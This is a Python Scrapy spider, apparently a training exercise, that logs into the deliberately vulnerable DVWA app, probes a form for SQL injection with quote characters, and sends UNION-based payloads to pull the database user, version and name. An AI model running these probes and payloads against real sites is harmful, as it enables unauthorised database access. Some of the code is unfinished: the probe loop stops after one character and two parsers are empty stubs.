import scrapy as scrapy
from bs4 import BeautifulSoup
from dvwacrawler.constants import *
from scrapy import Spider

from dvwacrawler.items import DvwacrawlerItem
from parser import html_parser


class DVWASpider(Spider):
    """
    name - name of the spider to be called with "scrapy crawl dvwa_spider
    sqli_characters - characters to use in the vulnerability scan
    db_users - dictionary to populate with the users found in the vulnerability
    """
    name = 'dvwa_spider'
    sqli_characters = ["'", "\"", "`"]
    count = 0
    db_users = {}

    def __init__(self, *args, **kwargs):
        super(DVWASpider, self).__init__(*args, **kwargs)
        self.login_user = DVWA_LOGIN_USERNAME
        self.login_pass = DVWA_LOGIN_PASSWORD

    def start_requests(self):
        yield scrapy.Request(DVWA_BASE_URL + DVWA_LOGIN_PAGE, callback=self.login)

    def login(self, response):
        """
        Function to initiate login with constant variables
        :param response:
        :return:
        """
        self.logger.info("Attempting login to DVWA")
        try:
            yield scrapy.FormRequest.from_response(response,
                                                   formdata={'username': DVWA_LOGIN_USERNAME,
                                                             'password': DVWA_LOGIN_PASSWORD},
                                                   callback=self.post_login)

        except Exception:
            return self.logger.error("Login Failed")

    def post_login(self, response):
        """
        Post Login function checks if the login was successful by what appears in the response text
        :param response:
        :return:
        """
        if self.login_user in response.text:
            self.logger.info("Successfully logged into DVWA Web App")
            yield scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
                                 callback=self.vulnerability_scan,
                                 cookies={DVWA_SECURITY_KEY: DVWA_SECURITY_VALUE})

        else:
            return self.logger.error("Failed to log in.. Retry with correct credentials")

    def vulnerability_scan(self, response):
        """
        Loops through the sqli_characters and launches the form request using the item in the list
        :param response:
        :return:
        """
        for sql_char in self.sqli_characters:
            print("In loop. Char - {}".format(sql_char))
            return scrapy.FormRequest.from_response(
                response,
                formdata={'id': sql_char,
                          'Submit': 'Submit'},
                cookies={'security': 'low'},
                callback=self.scan_results
            )

    def scan_results(self, response):
        """
        Logic to test if the sql Character worked
        :param response:
        :return:
        """
        confirm_vuln = "You have an error in your SQL syntax;"
        print(response.text)
        if confirm_vuln.lower() in response.text.lower():
            # launch_payload = scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
            #                                 callback=self.payloads)
            print("Vulnerable")
            return scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
                                  callback=self.payloads,
                                  cookies={'security': 'low'})
        else:
            return scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
                                  callback=self.vulnerability_scan,
                                  cookies={DVWA_SECURITY_KEY: DVWA_SECURITY_VALUE})

    def payloads(self, response):
        type = response.meta.get('type')
        payloads = ["%' or 0=0 union select null, user() #",
                    "%' or 0=0 union select null, version() #",
                    "%' or 0=0 union select null, database() #"
                    ]
        print("Im in payloads")
        if not type:
            yield scrapy.FormRequest.from_response(
                response,
                formdata={'id': payloads[0]},
                callback=self.parse_users
            )
            # return scrapy.Request.
        elif type == "version":
            yield scrapy.FormRequest.from_response(
                response,
                formdata={'id': payloads[1]},
                callback=self.parse_version
            )
        elif type == "database":
            yield scrapy.FormRequest.from_response(
                response,
                formdata={'id': payloads[2]},
                callback=self.parse_database
            )

    def parse_users(self, response):
        firstname, surname = html_parser(response)
        self.db_users = {'first_name': firstname, 'surname': surname}
        # item = DvwacrawlerItem()
        # item['first_name'] = firstname
        # item['surname'] = surname
        # print("Items - {}".format(item))
        # yield item
        print(self.db_users)

        launch_payload = scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
                                        callback=self.payloads)
        launch_payload.meta['type'] = 'version'
        return launch_payload

    def parse_version(self, response):
        first_name, surname = html_parser(response)

        # for item in self.db_users:
        #     if first_name and surname

    def parse_database(self, response):
        first_name, surname = html_parser(response)
